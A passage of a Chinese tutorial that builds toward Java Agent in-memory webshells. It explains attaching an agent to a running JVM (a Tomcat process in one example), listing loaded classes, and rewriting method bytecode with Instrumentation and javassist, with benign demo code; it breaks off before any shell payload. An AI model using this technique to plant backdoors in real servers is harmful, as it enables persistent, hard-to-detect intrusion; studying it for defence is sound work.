style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 加载agent，agentmain方法靠的就是这个方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void loadAgent(String agent) { ... }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="实现举例">实现举例<a href="#实现举例" class="hash-link" aria-label="实现举例的直接链接" title="实现举例的直接链接">​</a></h3>
<ul>
<li>Attach.java（找到进程，加载<code>agentMain.jar</code>）</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AgentInitializationException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AgentLoadException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AttachNotSupportedException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.VirtualMachine;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Attach {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if(args.length == 2){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String pid = args[0];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String jarName = args[1];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;attach 的 pid ==&gt; &quot; + pid);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;attach 的 jarName ==&gt; &quot; + jarName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 连接到JVM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            VirtualMachine virtualMachine = VirtualMachine.attach(pid);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 加载agentmain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            virtualMachine.loadAgent(jarName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 断开连接</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            virtualMachine.detach();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;ends&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        else{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;至少2个参数&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 列出所有的jvm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(VirtualMachine.list());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>AgentMain.java（想要动态实现的代码）</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.Instrumentation;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class AgentMain {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void agentmain(String agentArgs, Instrumentation inst) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for(int i=0; i &lt; 5; i+=1){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;called agentmain&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>可以写一起打包成一个jar，也可以分开打包成2个，问题都不大，只要<code>MANIFST.MF</code>没问题就行</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Manifest-Version: 1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PreMain-Class: PreMain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Agent-Class: AgentMain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Main-Class: Attach</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>找一下想要操作的jvm的pid（也可以用上面的<code>list()</code>方法看到pid）</li>
</ul>
<p>![image-20211126132236606](Java Agent 内存马.assets/image-20211126132236606.png)</p>
<ul>
<li>配置参数</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> attach.jar </span><span class="token number" style="color:#36acaa">63242</span><span class="token plain"> agentMain.jar</span><br></span></code></pre></div></div>
<p>也可以手动在idea里面配置好</p>
<p>![image-20211126132408117](Java Agent 内存马.assets/image-20211126132408117.png)</p>
<ul>
<li>运行</li>
</ul>
<p>![image-20211126132804923](Java Agent 内存马.assets/image-20211126132804923.png)</p>
<ul>
<li>转到我们想要attach的tomcat中看看效果</li>
</ul>
<p>![image-20211126132849089](Java Agent 内存马.assets/image-20211126132849089.png)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="instrumentation">Instrumentation<a href="#instrumentation" class="hash-link" aria-label="Instrumentation的直接链接" title="Instrumentation的直接链接">​</a></h2>
<p>刚才说了第二个参数<code>Instrumentation inst</code>相当重要，inst 是一个 <code>java.lang.instrument.Instrumentation</code> 的实例，由 JVM 自动传入。<code>java.lang.instrument.Instrumentation</code> 是 <code>instrument</code> 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。</p>
<p>下面列出这个类的一些方法，更加详细的介绍和方法，可以参照<a href="https://docs.oracle.com/javase/9/docs/api/java/lang/instrument/package-summary.html" target="_blank" rel="noopener noreferrer">官方文档</a>，也可以看这个类源码里面的说明</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public interface Instrumentation {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 删除一个类转换器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    boolean removeTransformer(ClassFileTransformer transformer);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 判断目标类是否能够修改。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    boolean isModifiableClass(Class&lt;?&gt; theClass);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 获取目标已经加载的类。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @SuppressWarnings(&quot;rawtypes&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Class[] getAllLoadedClasses();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="获取所有可修改类">获取所有可修改类<a href="#获取所有可修改类" class="hash-link" aria-label="获取所有可修改类的直接链接" title="获取所有可修改类的直接链接">​</a></h3>
<p>先介绍<code>getAllLoadedClasses</code>和<code>isModifiableClasses</code>。顾名思义：</p>
<ul>
<li><code>getAllLoadedClasses</code>：获取所有已经加载的类。</li>
<li><code>isModifiableClasses</code>：判断某个类是否能被修改。</li>
</ul>
<p>修改刚才的<code>AgentMain.java</code>，并编译</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.Instrumentation;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class AgentMain {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void agentmain(String agentArgs, Instrumentation inst) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for (Class cls : allLoadedClasses){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(cls.getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.print(&quot;isModifiableClass: &quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(inst.isModifiableClass(cls)?&quot;true&quot;:&quot;false&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>修改<code>Attach.java</code>,并重新attach到jvm中</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AgentInitializationException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AgentLoadException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.AttachNotSupportedException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.tools.attach.VirtualMachine;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Attach {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 列出所有的jvm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(VirtualMachine.list());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String pid = &quot;68588&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String jarName = &quot;/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 连接到JVM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        VirtualMachine virtualMachine = VirtualMachine.attach(pid);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 加载agentmain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtualMachine.loadAgent(jarName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 断开连接</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtualMachine.detach();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;ends&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>运行后</p>
<p>![image-20211126150313407](Java Agent 内存马.assets/image-20211126150313407.png)</p>
<p>得到了目标JVM上所有已经加载的类，并且知道了这些类能否被修改</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修改类">修改类<a href="#修改类" class="hash-link" aria-label="修改类的直接链接" title="修改类的直接链接">​</a></h3>
<p>使用<code>addTransformer()</code>和<code>retransformClasses()</code>可以篡改Class的字节码</p>
<p>首先再看一下这两个方法的声明：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public interface Instrumentation {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 删除一个类转换器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    boolean removeTransformer(ClassFileTransformer transformer);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>在<code>addTransformer()</code>方法中，有一个参数<code>ClassFileTransformer transformer</code>。这个参数将帮助我们完成字节码的修改工作。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="classfiletransformer">ClassFileTransformer<a href="#classfiletransformer" class="hash-link" aria-label="ClassFileTransformer的直接链接" title="ClassFileTransformer的直接链接">​</a></h4>
<p><code>ClassFileTransformer</code>也是一个接口，它提供了<code>transform</code>方法，此方法的实现可能会转换提供的类文件并返回新的替换类文件。</p>
<p>![image-20211126150952479](Java Agent 内存马.assets/image-20211126150952479.png)</p>
<p>接口注释简单概括一下：</p>
<ol>
<li>使用<code>Instrumentation.addTransformer()</code>来加载一个转换器。</li>
<li>转换器的返回结果（<code>transform()</code>方法的返回值）将成为转换后的字节码。</li>
<li>对于没有加载的类，会使用<code>ClassLoader.defineClass()</code>定义它；对于已经加载的类，会使用<code>ClassLoader.redefineClasses()</code>重新定义，并配合<code>Instrumentation.retransformClasses</code>进行转换。</li>
</ol>
<p>现在已经知道了怎样能修改Class的字节码，具体的做法还需要用到另一个类库<code>javassist</code>来获取字节码，不了解的可以网上找文章了解下，可以简单理解为：通过这个类库可以直接创建一个class字节码文件</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="javassist">javassist<a href="#javassist" class="hash-link" aria-label="javassist的直接链接" title="javassist的直接链接">​</a></h4>
<p>因为我们的目的只是修改某个类的某个方法，所以着重介绍下<code>CtMethod</code>，其他需要的简单过一下</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="依赖">依赖<a href="#依赖" class="hash-link" aria-label="依赖的直接链接" title="依赖的直接链接">​</a></h5>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.javassist</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">javassist</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">3.28.0-GA</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="classpool">ClassPool<a href="#classpool" class="hash-link" aria-label="ClassPool的直接链接" title="ClassPool的直接链接">​</a></h5>
<p>这个类是<code>javassist</code>的核心组件之一。</p>
<p>来看一下官方对他的介绍：</p>
<blockquote>
<p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。</p>
</blockquote>
<p>简单来说，这就是个容器，存放的是<code>CtClass</code>对象。</p>
<p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="ctclass">CtClass<a href="#ctclass" class="hash-link" aria-label="CtClass的直接链接" title="CtClass的直接链接">​</a></h5>
<p>可以把它理解成加强版的<code>Class</code>对象，需要从<code>ClassPool</code>中获得。</p>
<p>获得方法：<code>CtClass cc = cp.get(ClassName)</code>。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="ctmethod">CtMethod<a href="#ctmethod" class="hash-link" aria-label="CtMethod的直接链接" title="CtMethod的直接链接">​</a></h5>
<p>同理，可以理解成加强版的<code>Method</code>对象。</p>
<p>获得方法：<code>CtMethod m = cc.getDeclaredMethod(MethodName)</code>。</p>
<p>这个类提供了一些方法，使我们可以便捷的修改方法体：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public final class CtMethod extends CtBehavior {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 主要的内容都在父类 CtBehavior 中</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 父类 CtBehavior</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public abstract class CtBehavior extends CtMember {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 设置方法体</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setBody(String src);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 插入在方法体最前面</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void insertBefore(String src);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 插入在方法体最后面</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void insertAfter(String src);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 在方法体的某一行插入内容</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int insertAt(int lineNum, String src);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>传递给方法 <code>insertBefore()</code> ，<code>insertAfter()</code> 和 <code>insertAt()</code> 的 String 对象<strong>是由<code>Javassist</code> 的编译器编译的</strong>。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
<table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code>, <code>$1</code>, <code>$2</code>, ...</td><td><code>$0 = this; $1 = args[1] .....</code></td></tr><tr><td><code>$args</code></td><td>方法参数数组.它的类型为 <code>Object[]</code></td></tr><tr><td><code>$$</code></td><td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>...<code>)</code></td></tr><tr><td><code>$cflow(</code>...<code>)</code></td><td><code>cflow</code> 变量</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$w</code></td><td>包装器类型，用于强制类型转换</td></tr><tr><td><code>$_</code></td><td>返回值</td></tr></tbody></table>
<p>详细的内容可以看<a href="https://www.jianshu.com/p/b9b3ff0e1bf8" target="_blank" rel="noopener noreferrer">Javassist 使用指南（二）</a>。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="示例">示例<a href="#示例" class="hash-link" aria-label="示例的直接链接" title="示例的直接链接">​</a></h4>
<p>举例说明一下是如何动态修改类字节码的</p>
<p>先说2个注意点：</p>
<ul>
<li>如果在使用过程中找不到javassist包中的类（因为目标环境也需要这个类库，不然会找不到Class），那么可以使用URLCLassLoader+反射的方式调用</li>
<li>需要在<code>agent.jar</code>中的<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>，不然会抛出异常<code>UnmodifiableClassException</code></li>
</ul>
<hr>
<ul>
<li>被动态修改的类源码，其中<code>Hello</code>类的<code>hello</code>方法是我们要动态修改的目标，用<code>Scanner</code>是为了保证程序不停止，给我们留有操作的时间</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// Main.java</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Scanner;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Main {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Hello h1 = new Hello();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        h1.hello();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;等待输入...&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new Scanner(System.in).next();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Hello h2 = new Hello();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        h2.hello();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Hello.java</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Hello {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void hello(){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;hello world&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>运行并获取pid（69484）</li>
</ul>
<p>![image-20211126164528918](Java Agent 内存马.assets/image-20211126164528918.png)</p>
<ul>
